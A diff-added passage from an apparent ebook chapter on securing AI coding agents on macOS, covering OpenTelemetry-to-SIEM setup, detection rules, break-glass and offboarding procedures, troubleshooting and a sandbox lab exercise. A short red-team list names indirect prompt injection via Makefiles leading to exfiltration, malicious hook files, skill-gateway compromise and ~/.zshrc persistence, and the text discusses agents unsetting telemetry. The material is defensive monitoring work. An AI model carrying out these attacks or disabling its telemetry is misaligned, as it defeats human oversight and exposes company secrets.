+
+**Privacy defaults — keep off unless compliance approves:**
+
+| Variable | Risk if enabled |
+|----------|-----------------|
+| `OTEL_LOG_USER_PROMPTS` | PII and source code in SIEM |
+| `OTEL_LOG_TOOL_CONTENT` | Full tool I/O in traces |
+| `OTEL_LOG_RAW_API_BODIES` | Entire conversation history |
+
+**SIEM mappings** (log `event.name` attribute):
+
+| Question | `event.name` | Key attributes |
+|----------|--------------|----------------|
+| Tool allowed/denied? | `tool_decision` | `decision`, `source`, `tool_name` |
+| Hook blocked? | `hook_execution_complete` | `num_blocking` |
+| Mode escalation? | `permission_mode_changed` | `from_mode`, `to_mode` |
+| MCP connect? | `mcp_server_connection` | `server_name`, `status` |
+
+Metric names use `claude_code.*` prefix (e.g., `claude_code.tool_decision`). Codex uses `codex.tool_decision`, `codex.tool_result`.
+
+### Codex `[otel]` block
+
+```toml
+[otel]
+environment = "prod"
+exporter = { otlp-http = {
+  endpoint = "http://127.0.0.1:4318/v1/logs",
+  protocol = "binary"
+}}
+metrics_exporter = { otlp-http = {
+  endpoint = "http://127.0.0.1:4318/v1/metrics",
+  protocol = "binary"
+}}
+trace_exporter = { otlp-http = {
+  endpoint = "http://127.0.0.1:4318/v1/traces",
+  protocol = "binary"
+}}
+log_user_prompt = false
+```
+
+> **Critical:** `metrics_exporter` defaults to **Statsig** if unset — metrics will not reach your OTLP collector.
+
+### Cursor — hook-based OTel
+
+No first-party OTel in Cursor IDE/CLI today. Use [o11y-dev/opentelemetry-hooks](https://github.com/o11y-dev/opentelemetry-hooks) or [last9/cursorscope](https://github.com/last9/cursorscope). Separate **enforcement hooks** from **telemetry forwarder hooks**.
+
+### Collector backends
+
+| Destination | Ingest path | Notes |
+|-------------|-------------|-------|
+| **Datadog** | OTLP intake or `datadog` exporter | Logs, metrics, traces |
+| **Splunk** | `splunk_hec` exporter | Set `sourcetype`, CIM mapping |
+| **Elastic** | `elasticsearch` exporter or native OTLP | ECS mapping; ties to Ch 18 Logstash path |
+| **Microsoft Sentinel** | Logs Ingestion API + DCR | Not the `azuremonitor` exporter alone |
+| **CrowdStrike LogScale** | HEC-compatible / OTLP | EDR-aware fleets |
+| **Grafana stack** | Tempo, Loki, Mimir | Self-hosted pattern |
+
+> **Note:** Wiz is a cloud security posture platform — **not** an agent OTLP sink.
+
+**Cost vs. security telemetry:** route token/cost **metrics** to FinOps dashboards; route `tool_decision` **logs** to security SIEM — same collector, different pipelines.
+
+### Supplementary streams
+
+Merge via `filelog` receiver:
+
+```yaml
+receivers:
+  filelog/sbx:
+    include: [/var/log/sbx-policy.log]
+    operators:
+      - type: json_parser
+        timestamp:
+          parse_from: attributes.time
+```
+
+| Source | Content |
+|--------|---------|
+| `sbx policy log` | Allowed/blocked egress |
+| Hook audit JSON | Custom PostToolUse logs |
+| Santa logs | Binary execution (Ch 21) |
+
+### Privacy, dual-use, and tampering
+
+- Detailed OTel flags make the **SIEM a secret store** — insider threat and legal review (GDPR, works councils)
+- Prevent agents from unsetting `CLAUDE_CODE_ENABLE_TELEMETRY` via **non-overridable managed settings**
+- Alert on **missing expected telemetry** (dead-man's switch)
+- **OTel is not a preventive control** — it complements hooks and sandboxes
+
+### Detection examples
+
+- Spike in `tool_decision` where `decision=deny` and `source=hook`
+- `permission_mode_changed` toward bypass modes → break-glass investigation
+- `mcp_server_connection` to unknown server after failures → supply chain (23.7)
+- Cross-correlate OTel bash commands with osquery `process_events`
+
+See `ebook/assets/sample_configs/otel-collector-agents.yaml` for a starter collector skeleton.
+
+## 23.12 Governance, Rollout, and Enterprise Patterns
+
+### Data classification tiers
+
+| Tier | Example | Default control |
+|------|---------|-----------------|
+| Public | Open docs | Host + hooks acceptable |
+| Internal | App repos | Native Seatbelt + hooks |
+| Confidential | Customer data | `sbx` or `sbx --clone` |
+| Regulated | PCI/PHI adjacent | No agent without exception |
+
+### Break-glass procedure
+
+1. Named approver authorizes YOLO / `danger-full-access` / `--dangerously-skip-permissions`
+2. Time-boxed session with mandatory SIEM alerting
+3. Session recording where policy allows
+4. **Rotate all credentials** the session could have accessed
+5. Post-incident review within 24 hours
+
+### Offboarding runbook
+
+- Revoke agent API keys and MCP OAuth tokens
+- Rotate cloud IAM roles assumed from laptop
+- Wipe local clones and sandbox VMs
+- Purge or anonymize attributable OTel data per retention policy
+
+### Incident response
+
+Detect → contain → preserve `sbx policy log` before VM destroy → rotate creds → root-cause (injection vector, skill, hook?).
+
+### Git / VCS policy
+
+- Branch protection on `main`; no agent `git push --force`
+- Do not grant agents access to GPG/SSH **signing** keys — attribution problem
+- Review agent commits like any other contributor
+
+### Sandbox rollout maturity
+
+1. Ad-hoc pilots with OTel to SIEM
+2. Guardrails for crown-jewel repos (`--clone`, hooks)
+3. Default sandboxed workflows for routine coding
+4. Policy + telemetry integration with dashboard review
+
+### Red-team scenarios
+
+- Indirect injection via `Makefile` / dependency → exfil through model API
+- Malicious `.cursor/hooks.json` in cloned repo
+- Skill gateway compromise → fleet-wide tool invocation
+- Host-path bypass via `~/.zshrc` persistence
+
+## 23.13 Comprehensive Troubleshooting
+
+| Symptom | Diagnosis | Solution |
+|---------|-----------|----------|
+| `sbx run` fails on Intel Mac | Platform unsupported | Native Seatbelt or Linux KVM `sbx` |
+| API key not picked up | Secret store / proxy | `sbx secret set`; check proxy injection |
+| Network blocks registry | Policy too strict | `sbx policy allow network …`; review `sbx policy log` |
+| Cursor sandbox unavailable | Preflight / flags | `agent --debug`; fallback allowlist mode |
+| OTel not reaching SIEM | Network / endpoint | Allowlist collector; verify Codex `network_access` |
+| Agent edits unexpected host files | Direct mount | `sbx --clone`; restrict workspace |
+| Agent reads `~/.ssh` | Cursor full-FS read | `beforeReadFile` + `failClosed`; not `sandbox.json` alone |
+| Agent has Full Disk Access | Host IDE/Terminal FDA | Remove FDA from agent host app |
+| Telemetry absent | OTel unset / tampered | MDM managed settings; dead-man's-switch alert |
+| Project hooks override enterprise deny | Precedence bug | Verify managed deny is non-overridable |
+| SSH agent socket reachable | `SSH_AUTH_SOCK` exposed | Unset forwarding; hook block on socket path |
+| Santa blocks agent binary | Unknown TeamID | Monitor mode; add TeamID rule |
+| osquery false positives | Agent spawn resembles LOTL | Tune queries; correlate with sandbox markers |
+
+Pin `sbx` and agent CLI versions in MDM. Test upgrades in a pilot ring before fleet rollout.
+
+## Chapter 23 Exercise
+
+**Goal:** Deploy sandboxed agent workflows and policy-based host-path guardrails on an Apple Silicon Mac.
+
+**Tasks:**
+
+1. Install `sbx` and run `cd ~/my-project && sbx run claude`
+2. Apply deny-by-default network policy; verify blocks in `sbx policy log`
+3. Run **`sbx run --clone`** on a Git repo; confirm host files are read-only
+4. Create `.agent-isolation-required` and a wrapper using `cd && sbx run` syntax
+5. Author **`AGENTS.md`** with Security considerations; add **`CLAUDE.md`** with `@AGENTS.md` import
+6. Add a **command hook** blocking writes to `~/.ssh` and `.git/hooks` — **negative test** the block
+7. Create `.cursor/sandbox.json` with `networkPolicy` default deny; document SSH needs hook protection
+8. Create `.mcp/allowlist.json` deny-by-default
+9. Run local **`otelcol-contrib`**; configure Claude or Codex OTel with `metrics_exporter`; verify `tool_decision` events
+10. Verify **prompt redaction** at the collector before SIEM ingest
+11. Draft a one-page policy with **host-path exception** for Xcode/signing (fictional `billing-service` repo)
+12. Plan Santa monitor-mode observation for agent CLI binaries
+13. **`sbx rm`** cleanup — list and remove lab sandboxes
+
+**Bonus:** osquery query correlating OTel bash patterns with `process_events`; compare Elastic vs Sentinel vs Splunk routing.
+
+## macOS Scripting Tips
+
+- Use `cd "$workspace" && sbx run claude -- "$@"` — not `sbx run claude "$workspace"`
+- Prefer `sbx secret set` for supported providers; arbitrary secrets in VM are agent-readable
+- Default `sbx` mount is live on host — use `--clone` for sensitive repos
+- `sandbox-exec` is deprecated but still load-bearing for Seatbelt agents
+- **CLAUDE.md / AGENTS.md steer; hooks enforce**
+- LLM-as-judge hooks are probabilistic — stack under command hooks
+- Cursor `beforeMCPExecution`: set `failClosed: true` for critical gates
+- Point agents at one **OTLP collector** — avoid direct laptop-to-Splunk without buffering
+- Keep `OTEL_LOG_USER_PROMPTS` and Codex `log_user_prompt` off unless compliance approves
+- Marker files are not cryptographic guarantees — pair with Santa, shim, and MDM
+- Apple Silicon required for macOS `sbx` lab
+- Test network policies with `sbx policy log` before enforcement
+
+## References and Further Reading
+
+- Docker `sbx` Sandboxes documentation (architecture, network policies, agents)
+- [agents.md](https://agents.md/) open standard
+- Claude Code: memory (`CLAUDE.md`), [hooks reference](https://code.claude.com/docs/en/hooks), [monitoring / SIEM](https://code.claude.com/docs/en/monitoring-usage/)
+- Codex CLI hooks and `requirements.toml`; `[otel]` configuration
+- Cursor: [sandbox.json](https://cursor.com/docs/reference/sandbox), [agent hooks](https://cursor.com/docs/agent/hooks)
+- GitHub Copilot CLI hooks reference
+- [o11y-dev/opentelemetry-hooks](https://github.com/o11y-dev/opentelemetry-hooks); [last9/cursorscope](https://github.com/last9/cursorscope)
+- OpenTelemetry Collector contrib exporters (Datadog, Splunk HEC, Elasticsearch)
+- OpenTelemetry GenAI semantic conventions
+- OWASP LLM Top 10 (LLM01, LLM07, LLM08)
+- NIST SSDF / AI RMF
+- Devin Desktop / Devin Local documentation
+- Author further reading (not primary sources):
+  - [Docker Sandboxes for AI Coding Agents](https://me.itsecurity.network/blog/docker-sandboxes-enterprise-security-for-ai-coding-agents/)
+  - [Agent Skills Supply Chain](https://me.itsecurity.network/blog/agent-skills-the-new-supply-chain-attack-vector/)
+  - [Building Workforce Security Guardrails](https://me.itsecurity.network/blog/building_workforce_security_guardrails/)
